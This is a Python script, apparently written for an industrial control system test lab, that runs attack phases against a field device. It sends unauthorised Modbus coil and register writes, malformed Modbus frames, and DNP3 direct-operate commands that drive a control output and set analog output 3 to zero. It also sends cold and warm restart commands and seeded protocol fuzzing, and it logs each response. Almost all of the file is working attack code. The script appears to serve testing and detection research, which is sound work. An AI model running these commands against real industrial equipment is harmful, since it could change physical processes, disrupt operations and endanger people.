#!/usr/bin/env python3
"""OT attack phases against the field device, standard library only (runs on the Kali image next to ot_poll.py).

usage: ot_attack.py <phase> <ip> <out.csv> [--src 10.1.1.66] [--seed 1] [--count 300]
       ot_attack.py --selftest
phases:
  write      Modbus FC5 coil write, FC6 and FC16 holding-register writes (valid requests, unauthorised master)
  malformed  Modbus requests the sceptre-bennu #81 cases cover: truncated MBAP, MBAP length larger than the payload,
             oversized PDU, length 0; plus unassigned function codes 0x00, 0x2B, 0x5A, 0x7F
  dnp3       DNP3 DIRECT_OPERATE (g12v1 CROB index 0; g41v2 analog output 3 = 0), COLD_RESTART, WARM_RESTART
  fuzz       <count> Modbus frames with random PDUs, then <count> DNP3 link frames with valid header CRCs and random
             user data (seeded, so runs repeat)
Each case writes "epoch,phase,case,result" where result is resp:<hex prefix>, exc:<code>, closed, timeout or error.
"""
import argparse, os, random, socket, struct, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ot_poll import crc_dnp, dnp3_frame  # noqa: E402

UNASSIGNED_FCS = (0x00, 0x2B, 0x5A, 0x7F)


def mbap(tid: int, pdu: bytes, unit: int = 1, length: int = None) -> bytes:
    return struct.pack(">HHHB", tid, 0, len(pdu) + 1 if length is None else length, unit) + pdu


def malformed_cases():
    read = struct.pack(">BHH", 4, 30000, 10)
    yield "truncated_mbap", mbap(1, read)[:4]
    yield "length_gt_payload", mbap(2, read, length=200)
    yield "oversized_pdu", mbap(3, bytes([16]) + os.urandom(300), length=302)
    yield "length_zero", mbap(4, read, length=0)
    for i, fc in enumerate(UNASSIGNED_FCS):
        yield "fc_0x%02x" % fc, mbap(10 + i, bytes([fc, 0, 0, 0, 1]))


def write_cases():
    yield "fc5_coil0_on", mbap(1, struct.pack(">BHH", 5, 0, 0xFF00))
    yield "fc6_hr40000", mbap(2, struct.pack(">BHH", 6, 40000, 1234))
    yield "fc16_hr40000x3", mbap(3, struct.pack(">BHHB3H", 16, 40000, 3, 6, 111, 222, 333))


def dnp3_app(seq: int, fc: int, objects: bytes = b"") -> bytes:
    return bytes([0xC0 | (seq & 0x3F), 0xC0 | (seq & 0x0F), fc]) + objects


def dnp3_cases(dest: int = 10, src: int = 1):
    crob = bytes([12, 1, 0x17, 1, 0]) + bytes([0x03, 1]) + struct.pack("<II", 100, 100) + bytes([0])
    yield "direct_operate_crob0", dnp3_frame(dest, src, dnp3_app(1, 0x05, crob))
    # analog output 3 (g41v2: 16-bit value + status), set to 0: a real control point in the RTU's config
    ao = bytes([41, 2, 0x17, 1, 3]) + struct.pack("<h", 0) + bytes([0])
    yield "direct_operate_ao3", dnp3_frame(dest, src, dnp3_app(4, 0x05, ao))
    yield "cold_restart", dnp3_frame(dest, src, dnp3_app(2, 0x0D))
    yield "warm_restart", dnp3_frame(dest, src, dnp3_app(3, 0x0E))


def fuzz_cases(seed: int, count: int, dest: int = 10, src: int = 1):
    rng = random.Random(seed)
    for i in range(count):
        pdu = bytes(rng.randrange(256) for _ in range(rng.randrange(1, 253)))
        yield ("modbus", "mb_%d" % i, mbap(i & 0xFFFF, pdu))
    for i in range(count):
        user = bytes(rng.randrange(256) for _ in range(rng.randrange(1, 250)))
        yield ("dnp3", "dn_%d" % i, dnp3_frame(dest, src, user))


def send_case(ip: str, port: int, src: str, frame: bytes, wait: float = 1.0) -> str:
    try:
        s = socket.create_connection((ip, port), timeout=3, source_address=(src, 0) if src else None)
    except OSError as e:
        return "error:%s" % str(e).replace(",", ";")
    try:
        s.sendall(frame)
        s.settimeout(wait)
        data = s.recv(512)
        if not data:
            return "closed"
        if port == 502 and len(data) >= 9 and data[7] & 0x80:
            return "exc:%d" % data[8]
        return "resp:%s" % data[:16].hex()
    except socket.timeout:
        return "timeout"
    except OSError as e:
        return "error:%s" % str(e).replace(",", ";")
    finally:
        s.close()


def selftest() -> None:
    assert mbap(7, b"\x04\x75\x30\x00\x0a") == bytes.fromhex("0007000000060104753000 0a".replace(" ", ""))
    cases = dict(malformed_cases())
    assert len(cases["truncated_mbap"]) == 4 and struct.unpack(">H", cases["length_gt_payload"][4:6])[0] == 200
    assert struct.unpack(">H", cases["length_zero"][4:6])[0] == 0 and cases["fc_0x5a"][7] == 0x5A
    w = dict(write_cases())
    assert w["fc16_hr40000x3"][7] == 16 and struct.unpack(">H", w["fc6_hr40000"][8:10])[0] == 40000
    d = dict(dnp3_cases())
    ao = d["direct_operate_ao3"]
    assert ao[12] == 0x05 and ao[13:18] == bytes([41, 2, 0x17, 1, 3])  # DIRECT_OPERATE, g41v2, index 3
    assert d["cold_restart"][10 + 2] == 0x0D and crc_dnp(d["cold_restart"][:8]) == struct.unpack("<H", d["cold_restart"][8:10])[0]
    a, b = list(fuzz_cases(1, 3)), list(fuzz_cases(1, 3))
    assert a == b and len(a) == 6 and a[0][0] == "modbus" and a[-1][0] == "dnp3"
    print("selftest ok")


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("phase", nargs="?", choices=["write", "malformed", "dnp3", "fuzz"])
    p.add_argument("ip", nargs="?"); p.add_argument("out", nargs="?")
    p.add_argument("--src", default=""); p.add_argument("--seed", type=int, default=1)
    p.add_argument("--count", type=int, default=300); p.add_argument("--selftest", action="store_true")
    a = p.parse_args()
    if a.selftest:
        return selftest()
    out = open(a.out, "a", buffering=1)
    if a.phase == "fuzz":
        cases = ((n, 502 if proto == "modbus" else 20000, f) for proto, n, f in fuzz_cases(a.seed, a.count))
        wait = 0.2
    else:
        port = 20000 if a.phase == "dnp3" else 502
        gen = {"write": write_cases, "malformed": malformed_cases, "dnp3": dnp3_cases}[a.phase]
        cases = ((n, port, f) for n, f in gen())
        wait = 1.0
    for name, port, frame in cases:
        out.write("%.4f,%s,%s,%s\n" % (time.time(), a.phase, name, send_case(a.ip, port, a.src, frame, wait)))


if __name__ == "__main__":
    main()
